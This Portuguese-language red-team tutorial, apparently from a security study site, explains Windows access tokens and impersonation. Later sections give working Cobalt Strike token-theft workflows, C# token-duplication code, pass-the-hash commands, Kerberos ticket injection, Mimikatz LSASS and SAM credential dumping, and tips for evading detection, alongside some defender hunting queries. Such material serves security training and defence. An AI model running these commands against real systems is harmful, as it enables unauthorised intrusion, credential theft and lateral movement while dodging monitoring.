---
layout: cyber
section: pos-expl-windows
title: "Token Impersonation no Windows"
---

# 04 - Token Impersonation no Windows

# O que é?

Um **Windows Access Token** é um objeto do kernel do Windows que representa o contexto
de segurança de um processo ou thread. Quando um usuário realiza logon — seja
interativo, via rede ou como serviço — o Windows cria um token associado àquela sessão.
Todo processo iniciado por esse usuário herda uma cópia do token.

**Conteúdo de um Access Token:**

```
+------------------------------------------------------------------+
|                      ACCESS TOKEN                                |
+------------------------------------------------------------------+
| Token ID          : Identificador único do token no kernel       |
| Logon Session ID  : LUID da sessão de logon associada           |
+------------------------------------------------------------------+
| User SID          : S-1-5-21-xxx-yyy-zzz-1001                   |
|                     Identidade principal do token                |
+------------------------------------------------------------------+
| Group SIDs:                                                      |
|   S-1-5-32-544    (Administrators — local)                      |
|   S-1-5-21-xxx-512 (Domain Admins)                              |
|   S-1-5-21-xxx-513 (Domain Users)                               |
|   S-1-1-0          (Everyone)                                   |
|   S-1-5-11         (Authenticated Users)                        |
|   ... (todos os grupos AD do usuário)                           |
+------------------------------------------------------------------+
| Privileges (lista de capacidades especiais):                     |
|   SeDebugPrivilege        : Enabled   (abrir qualquer processo)  |
|   SeImpersonatePrivilege  : Enabled   (impersonar usuários)      |
|   SeBackupPrivilege       : Disabled  (ignorar DACLs de leitura) |
|   SeChangeNotifyPrivilege : Enabled   (bypass de traverse check) |
|   SeShutdownPrivilege     : Disabled  (encerrar o sistema)       |
+------------------------------------------------------------------+
| Default DACL      : ACL padrão aplicada a objetos criados        |
| Token Type        : Primary / Impersonation                      |
| Impersonation Level: Anonymous / Identification /                |
|                      Impersonation / Delegation                  |
| Integrity Level   : Low (0x1000) / Medium (0x2000) /            |
|                     High (0x3000) / System (0x4000)             |
| Origin            : LUID da logon session que criou o token      |
+------------------------------------------------------------------+
```

**Primary Token vs Impersonation Token:**

- **Primary Token**: associado ao processo inteiro (não a uma thread). Criado quando
  o processo é iniciado. Representa a identidade "oficial" do processo. Usado quando
  o processo acessa recursos em seu próprio nome, sem nenhuma thread de impersonation
  ativa.

- **Impersonation Token**: associado a uma thread específica. Criado temporariamente
  durante operações de impersonation. Quando a thread termina a impersonation (via
  `RevertToSelf()`), o token é descartado e a thread volta a usar o primary token do
  processo pai.

**Privileges relevantes para red team:**

- **SeImpersonatePrivilege**: permite que um processo assuma a identidade de qualquer
  usuário autenticado que se conecte a ele — por exemplo, via Named Pipe. Base de todos
  os ataques Potato. Concedido por padrão a contas de serviço (IIS, SQL Server) e
  administradores locais.

- **SeDebugPrivilege**: permite abrir qualquer processo (exceto PPL) com acesso total
  para leitura e escrita de memória. Necessário para `steal_token` de processos de
  outros usuários e para acesso ao LSASS. Concedido por padrão a administradores.

- **SeAssignPrimaryTokenPrivilege**: permite que um processo atribua um token primário
  a um processo filho — necessário para `CreateProcessAsUser()` com um token de outro
  usuário.

# Onde é implementado?

Access Tokens existem em todo e qualquer processo Windows — não há exceção. Todo
processo tem pelo menos um primary token. As situações onde impersonation tokens
são criados e usados de forma legítima são:

**COM/DCOM servers que atendem clientes remotos:**

Quando um cliente COM/DCOM chama um método em um servidor COM, o servidor pode chamar
`CoImpersonateClient()` para assumir temporariamente a identidade do cliente. Isso
permite que o servidor acesse recursos (arquivos, banco de dados) com os direitos do
cliente, implementando segurança no nível da chamada. O Windows SCM e o DCOM runtime
usam esse mecanismo extensivamente.

**Serviços Windows com SeImpersonatePrivilege:**

```
Contas com SeImpersonatePrivilege por padrão:
  IIS APPPOOL\DefaultAppPool     <- pool do IIS
  IIS APPPOOL\<NomePool>         <- qualquer pool do IIS
  NT AUTHORITY\Network Service   <- serviços de rede
  NT AUTHORITY\Local Service     <- serviços locais
  NT AUTHORITY\SYSTEM            <- serviços do sistema
  Membros do grupo Administrators
  Contas de serviço SQL Server (MSSQL)
  Contas de serviço de backup
```

**IIS executando requests em nome de usuários autenticados:**

Quando um site IIS usa Windows Authentication, o IIS chama `ImpersonateLoggedOnUser()`
para cada request, assumindo a identidade do usuário que autenticou. Isso permite que
o código ASP.NET/ISAPI acesse recursos de arquivo ou banco de dados com os direitos
daquele usuário específico, sem precisar de credenciais embutidas no código.

**Named Pipes — servidor impersonando cliente:**

O servidor de Named Pipe pode chamar `ImpersonateNamedPipeClient(hPipe)` após um
cliente se conectar. Isso fornece ao servidor um impersonation token do cliente,
permitindo verificar se o cliente tem acesso a recursos específicos. É o mecanismo
central dos ataques Potato — forçar um processo privilegiado (SYSTEM) a se conectar
a um Named Pipe controlado pelo atacante.

**SQL Server executando queries em contexto de usuário:**

O SQL Server usa impersonation para executar stored procedures no contexto de um
usuário específico via `EXECUTE AS`. O mecanismo subjacente usa `LogonUser()` e
`ImpersonateLoggedOnUser()` para trocar o contexto de segurança da thread de execução.

**Serviços de replicação e backup:**

Agentes de backup (como Windows Server Backup, Veeam, CommVault) usam impersonation
para acessar dados de diferentes usuários. A conta de serviço do agente precisa de
`SeBackupPrivilege` e frequentemente de `SeImpersonatePrivilege`.

# Como funciona de forma adequada?

**Fluxo de verificação de acesso com tokens:**

```
Thread solicita acesso ao objeto (arquivo, registry key, etc.)
                    |
                    v
        +------------------------+
        | Thread tem impersonation|
        | token ativo?           |
        +------------------------+
              |         |
             Sim        Não
              |         |
              v         v
       Usa impersonation  Usa primary token
           token          do processo
              |         |
              +----+----+
                   |
                   v
        +------------------------+
        | Security Reference     |
        | Monitor (SRM)          |
        |                        |
        | Compara SIDs do token  |
        | com DACL do objeto     |
        |                        |
        | Verifica Integrity     |
        | Level (MIC)            |
        +------------------------+
                   |
           +-------+-------+
           |               |
      Acesso OK        Acesso Negado
    (ACCESS_GRANTED)  (ACCESS_DENIED)
```

**Quatro níveis de Impersonation Level:**

```
Anonymous        — Servidor não tem informação sobre o cliente
                   Usado em conexões não-autenticadas
                   Não pode acessar recursos locais em nome do cliente

Identification   — Servidor pode identificar o cliente (ver SIDs e privileges)
                   NÃO pode impersonar — apenas consultar identidade
                   Usado por serviços que precisam verificar quem é o cliente
                   sem agir em seu nome

Impersonation    — Servidor pode impersonar o cliente LOCALMENTE
                   Pode acessar recursos no mesmo sistema como se fosse o cliente
                   NÃO pode ser usado para acessar recursos em outros sistemas remotos
                   É o nível que SeImpersonatePrivilege permite

Delegation       — Servidor pode impersonar o cliente REMOTAMENTE
                   Pode acessar recursos em outros hosts como se fosse o cliente
                   Requer Kerberos constrained ou unconstrained delegation
                   Não é fornecido por Named Pipes por padrão
```

**Como DuplicateToken / DuplicateTokenEx funcionam:**

```c
// Abrir o processo alvo com permissão de query
HANDLE hProcess = OpenProcess(
    PROCESS_QUERY_INFORMATION,   // acesso mínimo necessário
    FALSE,
    targetPID
);

// Obter o token do processo
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);

// Duplicar o token (criando uma cópia independente)
HANDLE hDupToken;
DuplicateTokenEx(
    hToken,
    TOKEN_ALL_ACCESS,
    NULL,
    SecurityImpersonation,    // nível de impersonation desejado
    TokenImpersonation,       // tipo: Impersonation (não Primary)
    &hDupToken
);

// Aplicar o token duplicado à thread atual
ImpersonateLoggedOnUser(hDupToken);
// Thread agora opera com a identidade do processo alvo

// ... acessar recursos como o outro usuário ...

// Reverter ao token original do processo
RevertToSelf();
CloseHandle(hDupToken);
CloseHandle(hToken);
CloseHandle(hProcess);
```

**Como ImpersonateNamedPipeClient funciona:**

```
Servidor cria o Named Pipe:
    CreateNamedPipe(
        "\\\\.\\pipe\\MeuServico",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        ...
    )

Servidor aguarda cliente:
    ConnectNamedPipe(hPipe, NULL)

Cliente (SYSTEM ou outro usuário) conecta:
    CreateFile("\\\\.\\pipe\\MeuServico", ...)

Servidor chama:
    ImpersonateNamedPipeClient(hPipe)
    // A thread do servidor agora tem um impersonation token
    // do cliente que conectou (nível Impersonation ou Delegation)

Servidor verifica identidade do cliente:
    GetTokenInformation(hToken, TokenUser, ...)
    // Ou acessa recursos locais como se fosse o cliente

Servidor reverte:
    RevertToSelf()
```

**Por que SeImpersonatePrivilege é necessário para serviços legítimos:**

O IIS, ao processar um request com Windows Authentication, precisa executar o código
da aplicação (ASP.NET handlers, ISAPI modules) no contexto de segurança do usuário
autenticado — não no contexto da conta de serviço IIS. Sem `SeImpersonatePrivilege`,
o IIS não conseguiria chamar `ImpersonateLoggedOnUser()` para fazer essa troca de
contexto. O mesmo vale para SQL Server com `EXECUTE AS USER` e para serviços de backup
que acessam dados de usuários.

**Relação com ataques Potato:**

Os ataques Potato (PrintSpoofer, RoguePotato, GodPotato, etc.) exploram exatamente
o mecanismo de Named Pipe + `ImpersonateNamedPipeClient`:

```
1. Atacante tem conta de serviço com SeImpersonatePrivilege
   (IIS App Pool, SQL Server service, Network Service, etc.)

2. Atacante cria Named Pipe malicioso

3. Atacante induz o processo SYSTEM a se conectar ao Named Pipe
   (via PrintSpooler, DCOM activation, token impersonation tricks)

4. Quando SYSTEM conecta, atacante chama ImpersonateNamedPipeClient()

5. Thread do atacante agora tem token SYSTEM com nível Impersonation

6. Atacante cria processo filho com esse token:
   CreateProcessWithToken(hSystemToken, ...)
   -> cmd.exe ou qualquer payload rodando como SYSTEM
```

O mecanismo é idêntico ao uso legítimo — a diferença é que o serviço que conecta ao
pipe é forçado a fazer isso (via coerção) em vez de fazer voluntariamente.

---

## Tokens, Logon Sessions e o Modelo de Identidade

### O Que São Access Tokens

Um **access token** é uma estrutura de dados criada pelo Windows quando um usuário (ou serviço) realiza logon. O token é associado ao processo do usuário e contém:

```
┌────────────────────────────────────────────────────────────┐
│                     ACCESS TOKEN                            │
├────────────────────────────────────────────────────────────┤
│ Token ID          : Identificador único do token            │
│ Logon Session ID  : Identifica a sessão de logon            │
│ User SID          : S-1-5-21-xxx-yyy-zzz-1001              │
│                                                            │
│ Group SIDs:                                                │
│   S-1-5-32-544 (Administrators)                           │
│   S-1-5-21-xxx-513 (Domain Users)                         │
│   S-1-5-21-xxx-512 (Domain Admins)                        │
│   ...                                                      │
│                                                            │
│ Privileges:                                                │
│   SeDebugPrivilege: Enabled                               │
│   SeImpersonatePrivilege: Enabled                         │
│   SeChangeNotifyPrivilege: Enabled                        │
│   ...                                                      │
│                                                            │
│ Default DACL      : ACL padrão para objetos criados       │
│ Token Type        : Primary / Impersonation               │
│ Impersonation Level: Anonymous/Identification/             │
│                      Impersonation/Delegation             │
│ Integrity Level   : Low/Medium/High/System                │
│ Origin            : LogonSession que criou o token        │
└────────────────────────────────────────────────────────────┘
```

### Primary Token vs Impersonation Token

**Primary Token:**
- Associado a um processo (não a uma thread)
- Criado quando um processo é iniciado
- Representa a identidade "oficial" do processo
- Usado quando o processo acessa recursos em seu próprio nome

**Impersonation Token:**
- Associado a uma thread específica
- Criado temporariamente durante operações de impersonation
- Permite que a thread opere com identidade diferente do processo principal
- Quatro níveis de impersonation:
  - `Anonymous`: Servidor não pode identificar o cliente
  - `Identification`: Servidor pode identificar mas não impersonate
  - `Impersonation`: Servidor pode impersonate localmente
  - `Delegation`: Servidor pode impersonate remotamente (requer Kerberos delegation)

### Como o Windows Usa Tokens para Autorização

Quando um thread acessa um recurso (arquivo, registry, serviço):

```
Thread solicita acesso ao objeto
         ↓
Windows checa: Thread tem impersonation token?
  ├── Sim → Usa impersonation token
  └── Não → Usa primary token do processo
         ↓
Compara SIDs do token com DACL do objeto
         ↓
Acesso concedido ou negado
```

### Named Pipe Impersonation (Base dos Potato Attacks)

O fluxo de Named Pipe Impersonation é:

```
1. Atacante cria um Named Pipe servidor
   └── CreateNamedPipe("\\.\pipe\MeuPipe", ...)

2. Induz um processo SYSTEM a se conectar ao pipe
   └── (via PrintSpoofer, DCOM abuse, etc.)

3. Quando SYSTEM conecta, o servidor pode chamar:
   └── ImpersonateNamedPipeClient(hPipeHandle)
   
4. Thread agora tem impersonation token de SYSTEM

5. Criar novo processo com este token:
   └── CreateProcessWithToken() ou CreateProcessAsUser()

6. Reverter impersonation:
   └── RevertToSelf()
```

### Integrity Levels e Obrigatório Access Control

O **Mandatory Integrity Control (MIC)** adiciona uma camada acima das DACLs:

```
┌─────────────────────────────────────────────────────────┐
│ System Integrity Level (SIL = 0x4000)                   │
│   └── SYSTEM processes, kernel drivers                  │
├─────────────────────────────────────────────────────────┤
│ High Integrity Level (HIL = 0x3000)                     │
│   └── Processos elevados via UAC, admin elevation       │
├─────────────────────────────────────────────────────────┤
│ Medium Integrity Level (MIL = 0x2000)                   │
│   └── Usuários padrão, admins com token filtrado        │
├─────────────────────────────────────────────────────────┤
│ Low Integrity Level (LIL = 0x1000)                      │
│   └── Browser sandboxes, AppContainer                   │
└─────────────────────────────────────────────────────────┘
```

Regra básica do MIC: Um processo de integridade mais baixa **não pode escrever** em um objeto de integridade mais alta (mesmo que a DACL permita). Mas **pode ler** (a menos que a SACL proíba especificamente).

---

## Na Prática

### Quando Usar Token Impersonation

**Cenário 1**: Você tem SYSTEM em um servidor e vê que um Domain Admin tem sessão ativa:
- `steal_token` do processo do admin
- Agora você pode acessar recursos de domínio como Domain Admin

**Cenário 2**: Você tem credenciais de um usuário mas não quer fazer logon de rede:
- `make_token` com as credenciais
- Você parece ser esse usuário para recursos de rede sem gerar Event 4624 (Network Logon)

**Cenário 3**: Você quer testar acesso de outro usuário sem criar evidências:
- `createnetonly` + `steal_token`
- Minimal footprint

**Cenário 4**: Você tem hash NTLM e precisa de acesso lateral:
- `pass-the-hash` via sekurlsa::pth ou impacket
- Gera process com token completo mas usando hash

---

## Exemplos de Código / Comandos

### make_token - Criação de Token com Credenciais

`make_token` usa a função Windows `LogonUser()` para criar um token com credenciais fornecidas. Dois subtipos importantes:

**LogonType 2 (Interactive)** - Cria sessão completa (gera Event 4624)
**LogonType 9 (NewCredentials)** - Não cria sessão nova, apenas troca credenciais para acesso de rede

O `make_token` no Cobalt Strike usa LogonType 9 (NewCredentials):

```
# No Cobalt Strike Beacon
make_token DOMAIN\username Password123

# Verificar token atual
getuid

# Reverter ao token original
rev2self

# Ver se funcionou acessando recurso de rede
ls \\FILESERVER01\Share$
```

**O que acontece internamente:**
1. `LogonUser("username", "DOMAIN", "Password123", LOGON32_LOGON_NEW_CREDENTIALS, ...)`
2. Novo token criado com as credenciais fornecidas mas **na mesma sessão de logon**
3. O token parece o mesmo para recursos **locais** mas usa as novas credenciais para recursos **de rede**
4. **NÃO gera Event 4624** (logon event) - porque não cria nova sessão
5. O que é gerado: Event 4648 (Explicit credential logon) em alguns cenários

**Comparação de eventos:**

```
make_token:
  - Event 4648: A logon was attempted using explicit credentials (às vezes)
  - NO Event 4624 (Logon)
  
steal_token:
  - Nenhum evento de autenticação
  - Pode gerar Event 4672 se o processo acessado tem privilégios especiais
  
createnetonly (Cobalt Strike):
  - Event 4648: Explicit credentials
  - LogonType 9 no destino (quando usado remotamente)
```

### steal_token - Roubo de Token de Processo

`steal_token` duplica o token de um processo existente e o aplica ao beacon:

```
# Listar processos e seus owners
ps
# ou
tasklist /v

# Roubar token de um processo específico (pelo PID)
steal_token 1234

# Verificar quem somos agora
getuid

# Reverter
rev2self
```

**O que acontece internamente:**
1. `OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID)` - abrir handle ao processo alvo
2. `OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)` - obter token do processo
3. `DuplicateTokenEx(hToken, ..., SecurityImpersonation, TokenImpersonation, &hNewToken)` - duplicar token
4. `ImpersonateLoggedOnUser(hNewToken)` - aplicar token ao thread atual

**Pré-requisitos:**
- `PROCESS_QUERY_INFORMATION` no processo alvo
- Isso é automaticamente possível se você é SYSTEM (mesmo para processos de outros users)
- Para processos de mais alta integridade: precisa de `SeDebugPrivilege`

**Selecionando o processo certo:**

```powershell
# Encontrar processos de usuários com alto privilégio
Get-WmiObject Win32_Process | 
    Select-Object Name, ProcessId, @{N='Owner';E={$_.GetOwner().User}} |
    Where-Object {$_.Owner -match "admin|system"} |
    Format-Table -AutoSize
```

Bons alvos para steal_token:
- `winlogon.exe` (roda como SYSTEM, sempre presente)
- `services.exe` (SYSTEM)
- Processos de Domain Admins ativos (ex: Explorer.exe de uma sessão RDP de admin)
- `lsass.exe` (SYSTEM - mas arriscado acessar)

### createnetonly - Melhor OPSEC para Lateral Movement

`createnetonly` cria um processo **sem UI, não-interativo**, com as credenciais fornecidas, usando LogonType 9:

```
# Criar processo "dummy" com credenciais
# O processo fica rodando mas sem janela
createnetonly /C:\Windows\System32\cmd.exe

# Output: Process ID: 4832 / Thread ID: 1337 / Token: 0x...

# Agora roubar o token deste processo
steal_token 4832

# Executar como o usuário
ls \\DC01\SYSVOL

# Reverter
rev2self
```

Por que esta combinação é melhor OPSEC:

```
Versus make_token:
  make_token → Token com credenciais mas sem processo filho
  createnetonly → Processo filho isolado + steal_token = Token de um processo real
  
OPSEC advantage:
  1. LogonType 9 (NewCredentials) não aparece como logon de rede suspeito
  2. Processo filho pode ter nome legítimo
  3. Token vem de um processo, não de uma chamada direta de LogonUser
  4. rev2self descarta completamente o token (não fica rastro no processo beacon)
```

### Pass-the-Hash com Token

Usando Mimikatz `sekurlsa::pth` para criar processo com hash:

```
# No Mimikatz
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

# Isso cria uma nova janela de cmd.exe com o token do usuário
# A nova janela pode ser usada para acesso lateral
```

**OPSEC**: `sekurlsa::pth` gera um process spawn que pode ser detectado. Prefira:

```bash
# Impacket Pass-the-Hash (mais versátil, sem criar processo Windows)
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10
impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10

# Pass-the-Hash com CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Verificar acesso sem executar (menos barulho)
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --no-bruteforce
```

### Token Duplication - Código C#

Entendendo como EDRs constroem detecção, é útil ver o código que implementa token duplication:

```csharp
using System;
using System.Runtime.InteropServices;

class TokenImpersonation {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    
    // SecurityImpersonation = 2, TokenImpersonation = 1
    
    public static bool ImpersonateProcess(int targetPID) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, targetPID);
        if (hProcess == IntPtr.Zero) {
            Console.WriteLine("OpenProcess falhou: " + Marshal.GetLastWin32Error());
            return false;
        }
        
        IntPtr hToken;
        if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken)) {
            Console.WriteLine("OpenProcessToken falhou: " + Marshal.GetLastWin32Error());
            CloseHandle(hProcess);
            return false;
        }
        
        IntPtr hNewToken;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hNewToken)) {
            Console.WriteLine("DuplicateTokenEx falhou: " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        if (!ImpersonateLoggedOnUser(hNewToken)) {
            Console.WriteLine("ImpersonateLoggedOnUser falhou: " + Marshal.GetLastWin32Error());
            CloseHandle(hNewToken);
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        Console.WriteLine("Impersonation bem-sucedida!");
        
        // Usar identidade...
        // Verificar: WindowsIdentity.GetCurrent().Name
        
        // Reverter
        RevertToSelf();
        
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return true;
    }
}
```

### Cobalt Strike - Workflow Completo de Token

```
# 1. Verificar contexto atual
getuid
# Output: CORP\lowprivuser

# 2. Listar processos e owners
ps
# Output mostra winlogon.exe como SYSTEM, explorer.exe como CORP\admin.user

# 3. Verificar integridade atual
# (se você é SYSTEM, pode roubar qualquer token)

# 4. Roubar token de um processo admin
steal_token 2456  # PID do explorer.exe do admin.user

# 5. Verificar novo contexto
getuid
# Output: CORP\admin.user

# 6. Acessar recurso que requer admin
ls \\DC01\C$

# 7. Spawnar beacon com novo token para persistência
# spawn [listener] - spawna processo filho com token atual
spawn http_listener

# 8. Reverter ao token original (importante!)
rev2self

getuid
# Output: CORP\lowprivuser (voltou ao contexto original)

# 9. Usar make_token para acesso de rede com credenciais específicas
make_token CORP\service.account P@ssw0rd2024

# 10. Acessar compartilhamento como service.account
ls \\FILESERVER\Backups$

# 11. Reverter
rev2self
```

### Elevating via Token com getsystem (Metasploit/CS)

```
# Metasploit
getsystem
# Tenta várias técnicas automaticamente:
# 1. Named pipe impersonation (SYSTEM)
# 2. Token duplication
# 3. COM/DCOM

# Cobalt Strike equivalente
getsystem
# Usa Named Pipe impersonation
```

### Pass-the-Ticket com Tokens

Kerberos tickets são também "tokens" de um tipo diferente. Podem ser injetados:

```
# Mimikatz - listar tickets na memória
sekurlsa::tickets
kerberos::list

# Exportar ticket TGT
sekurlsa::tickets /export

# Injetar ticket em sessão atual
kerberos::ptt ticket.kirbi

# Ou via Rubeus
Rubeus.exe dump /service:krbtgt
Rubeus.exe ptt /ticket:Base64EncodedTicket==
```

---

## Detecção e OPSEC

### Eventos Windows Gerados por Cada Técnica

```
make_token (LogonType 9):
  Eventos no HOST LOCAL:
  - Event 4648: "A logon was attempted using explicit credentials"
    Subject: current user
    Target: impersonated user
    Logon Type: 9 (NewCredentials)
  
  Eventos no HOST REMOTO (quando acessa recurso):
  - Event 4624: Logon
    Logon Type: 3 (Network)
    Authentication Package: NTLM ou Kerberos
  - Event 4768/4769: Kerberos TGT/TGS request (se Kerberos)

steal_token:
  Eventos no HOST LOCAL:
  - Sysmon Event 10: ProcessAccess
    SourceImage: beacon/payload
    TargetImage: processo alvo
    GrantedAccess: 0x400 (PROCESS_QUERY_INFORMATION)
  - Potencialmente Event 4673: Sensitive privilege use
  
  Eventos no HOST REMOTO (ao acessar recursos):
  - Idênticos ao que o usuário roubado geraria normalmente
  - (difícil de distinguir de acesso legítimo do usuário)

createnetonly (LogonType 9):
  Eventos no HOST LOCAL:
  - Event 4648: Explicit credentials logon
  - Event 4688: Process creation (para o processo criado)
  - Sysmon Event 1: Process creation
  
  NÃO gera:
  - Event 4624 com LogonType 2 (Interactive)
  - Event 4634 (Logon session terminado) até rev2self
```

### Estratégias de OPSEC para Token Operations

```powershell
# 1. Verificar quais handles ao LSASS são normalmente abertos
# Para não gerar anomalias extras
Get-Process | Where-Object {$_.Modules -match "lsass"} 

# 2. Preferir steal_token de processos não-LSASS
# winlogon.exe, services.exe, ou processos de usuários logados

# 3. Usar rev2self imediatamente após completar a operação necessária
# Não manter o token "estrangeiro" por mais tempo que necessário

# 4. Para acesso de rede, prefira make_token/createnetonly
# ao invés de steal_token quando tiver credenciais
# (gera menos artefatos de acesso ao processo alvo)

# 5. Em ambientes com Microsoft Defender for Identity (MDI):
# MDI monitora Event 4648 e correlaciona com outros eventos
# createnetonly + steal_token ainda assim é mais furtivo que PTH

# 6. Verificar se processo alvo tem Protected Process Light (PPL)
# Processos PPL como lsass.exe em Windows 8.1+ não podem ter handles abertos
# por processos não-PPL sem kernel driver
```

### Detectando Token Impersonation (Perspectiva do Defender)

```powershell
# Hunt: Processos acessando lsass.exe com GrantedAccess suspeito
# Sysmon Event 10 onde TargetImage = lsass.exe
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
    Where-Object {$_.Id -eq 10} |
    Where-Object {$_.Message -match "lsass.exe"} |
    Select-Object TimeCreated, Message

# Hunt: LogonType 9 incomum (createnetonly/make_token)
Get-WinEvent -LogName Security | 
    Where-Object {$_.Id -eq 4624} |
    Where-Object {$_.Message -match "LogonType.*9"} |
    Select-Object TimeCreated, Message

# Hunt: Process criado com token diferente do parent
# (DuplicateToken + CreateProcessWithToken)
# Visível em Sysmon Event 1 quando User != Parent Process User
```

### Resumo: Quando Usar Cada Método

| Situação | Método Recomendado | Motivo |
|----------|-------------------|--------|
| Tenho credenciais + quero acesso de rede silencioso | make_token | Sem logon event, mantém sessão local |
| SYSTEM + admin logado no servidor | steal_token | Sem credenciais necessárias |
| Quero separar contextos de forma clara | createnetonly + steal_token | Processo isolado, melhor controle |
| PTH sem Cobalt Strike | impacket tools | Sem artefato em disco, flexível |
| Pass-the-Ticket | Rubeus ptt | Injeta ticket Kerberos, acesso sem senha |
| Elevar para SYSTEM (tenho SeImpersonate) | PrintSpoofer/GodPotato | Token SYSTEM via named pipe |
| Elevar para SYSTEM (sem SeImpersonate) | getsystem / kernel exploit | Depende do contexto |

---

## Técnicas Avançadas de Roubo de Credenciais (MalTrak)

### Objetivos do Atacante e Contexto Estratégico

O objetivo final do red teamer ao trabalhar com roubo de credenciais e impersonation é atingir o nível de **Domain Admin**, pois isso garante:
- Acesso a DMZs e compartilhamentos protegidos
- Capacidade de operar de forma mais furtiva usando contas legítimas
- Manutenção de acesso mesmo após remediações parciais

A distinção fundamental entre **Autenticação** e **Autorização** é operacionalmente relevante: o DC verifica a identidade durante o logon e depois usa hashes (NTLM) ou tickets com expiração (Kerberos) para autorizar acessos subsequentes. Esse mecanismo é o que torna o roubo de tokens e credenciais tão eficaz — ao obter esses artefatos você não precisa passar pelo processo de autenticação novamente.

---

### Tipos de Logon: O Que Fica em Memória

O MalTrak enfatiza que o tipo de logon determina o que fica disponível para roubo:

| Método de Conexão | Tipo de Logon | Credenciais Reutilizáveis no Destino |
|---|---|---|
| Console local | Interactive | Sim |
| RUNAS | Interactive | Sim |
| RUNAS /NETWORK | NewCredentials | Sim |
| Remote Desktop (sucesso) | RemoteInteractive | Sim |
| Remote Desktop (falha) | RemoteInteractive | Nao |
| Net use \\SERVER | Network | Nao |
| PowerShell WinRM | Network | Nao |

**Regra prática para red teamers:** Logons interativos (tipo 2) e RemoteInteractive (tipo 10 - RDP) deixam credenciais reutilizáveis no destino. Network logons (tipo 3) não deixam — por isso WinRM e `net use` são menos interessantes para coleta de credenciais no host remoto.

Para auditar os tipos de logon ativos no ambiente:

```powershell
# Verificar sessões ativas
query user

# Auditoria de logon types via Event Log
Set-ExecutionPolicy unrestricted
.\Verify-Kerberos.ps1 -Records 20 | ft -auto
```

---

### Privilégios Críticos para Red Teamers

O MalTrak identifica três privilégios com impacto direto em operações de roubo de credenciais e impersonation:

**SeBackupPrivilege / SeRestorePrivilege:**
- Permitem acesso de leitura e escrita a qualquer arquivo, ignorando DACLs, usando `robocopy /b` ou APIs de backup
- Uso ofensivo: copiar SAM, SYSTEM e SECURITY hives sem acesso direto

**SeDebugPrivilege:**
- Permite abrir qualquer processo (não-PPL) com acesso total para leitura e escrita
- Uso ofensivo: acessar o espaço de memória do `lsass.exe` para extração de credenciais
- Concedido automaticamente a administradores

**SeImpersonatePrivilege:**
- Permite que o processo impersonate qualquer usuário logado e opere em seu nome para acessar recursos
- Concedido por padrão a administradores e contas de serviço IIS/SQL
- Base dos ataques Potato (PrintSpoofer, GodPotato, etc.)

---

### Roubo de Credenciais da Memória do lsass

#### Como as Credenciais Ficam no lsass

Credenciais de sessões interativas ficam armazenadas dentro do processo `lsass.exe`, especificamente na memória da `lsasrv.dll`. O mecanismo de extração funciona pela identificação de padrões únicos na memória desses módulos para recuperar senhas em texto claro (quando WDigest está ativo), hashes NTLM, tickets Kerberos, nomes de usuário e informações de domínio.

**Pré-requisito:** `SeDebugPrivilege` ativo antes de qualquer tentativa de acesso ao processo.

#### Extração Direta com Mimikatz (logonpasswords)

```
# Passo 1: habilitar SeDebugPrivilege
privilege::debug
# Output esperado: Privilege '20' OK

# Passo 2: extrair credenciais das sessões ativas
sekurlsa::logonpasswords

# Output exemplo:
# Authentication Id : 0 ; 1101366 (00000000:0010ce36)
# Session           : Interactive from 1
# User Name         : User
# Domain            : DESKTOP-1VUTB81
# Logon Server      : DESKTOP-1VUTB81
# Logon Time        : 7/9/2021 6:38:48 AM
# SID               : S-1-5-21-4158778063-1250727167-3994265684-1001
#   msv :
#     [00000003] Primary
#     * Username : User
#     * Domain   : DESKTOP-1VUTB81
#     * NTLM     : 4c8daf648d2c279035b91006e187a9e2
#     * SHA1     : cc5fd06799b19739656a01d3b91611e942743baa
```

#### Extração da SAM (Contas Locais) com Mimikatz

Para extrair hashes de contas locais armazenadas no arquivo SAM, é necessário elevar o token do Mimikatz para SYSTEM antes do dump:

```
# Passo 1: habilitar SeDebugPrivilege
privilege::debug

# Passo 2: elevar token interno do Mimikatz para SYSTEM
token::elevate
# Output: SID name : NT AUTHORITY\SYSTEM -> Impersonated!

# Passo 3: dump da SAM
lsadump::sam

# Output exemplo:
# Domain : DESKTOP-1VUTB81
